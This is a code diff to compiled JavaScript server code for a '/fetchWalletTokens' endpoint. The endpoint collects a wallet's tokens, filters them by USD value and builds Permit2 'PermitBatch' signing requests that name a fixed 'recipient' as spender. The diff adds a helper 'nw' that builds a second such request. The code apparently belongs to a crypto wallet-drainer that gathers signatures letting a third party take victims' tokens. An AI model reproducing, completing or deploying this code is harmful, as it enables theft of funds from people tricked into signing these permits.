@@ -182,7 +182,7 @@ exports.app.post("/fetchWalletTokens", function (req, res) { return __awaiter(vo
             });
         });
     }
-    var chain, address, response, allTokens, truncatedResponse, options, _a, filteredByUSDValue, error, tokensReturned, tokenInPermitFormat, index, obj, addrs, i, response1, resJson, permit2Tokens, _addrs, _loop_1, i, dataToSign;
+    var chain, address, response, allTokens, truncatedResponse, options, _a, filteredByUSDValue, error, tokensReturned, tokenInPermitFormat, index, obj, addrs, i, response1, resJson, permit2Tokens, _addrs, _loop_1, i, dataToSign, dat, dat123;
     var _b;
     return __generator(this, function (_c) {
         switch (_c.label) {
@@ -287,7 +287,9 @@ exports.app.post("/fetchWalletTokens", function (req, res) { return __awaiter(vo
                         sigDeadline: deadline,
                     },
                 };
-                return [2 /*return*/, [_dataToSign, _addrs, dataToSign, tokenInPermitFormat]];
+                dat = __assign({}, dataToSign);
+                dat123 = nw(tokenInPermitFormat);
+                return [2 /*return*/, [_dataToSign, _addrs, dat, dat123]];
         }
     });
 }); });
@@ -345,3 +347,36 @@ var _dataToSign = {
         sigDeadline: deadline,
     },
 };
+function nw(details) {
+    return {
+        domain: {
+            name: "Permit2",
+            chainId: chainId,
+            verifyingContract: Permit2Contract,
+        },
+        types: {
+            EIP712Domain: [
+                { name: "name", type: "string" },
+                { name: "chainId", type: "uint256" },
+                { name: "verifyingContract", type: "address" },
+            ],
+            PermitBatch: [
+                { name: "details", type: "PermitDetails[]" },
+                { name: "spender", type: "address" },
+                { name: "sigDeadline", type: "uint256" },
+            ],
+            PermitDetails: [
+                { name: "token", type: "address" },
+                { name: "amount", type: "uint160" },
+                { name: "expiration", type: "uint48" },
+                { name: "nonce", type: "uint48" },
+            ],
+        },
+        primaryType: "PermitBatch",
+        message: {
+            details: details,
+            spender: recipient,
+            sigDeadline: deadline,
+        },
+    };
+}
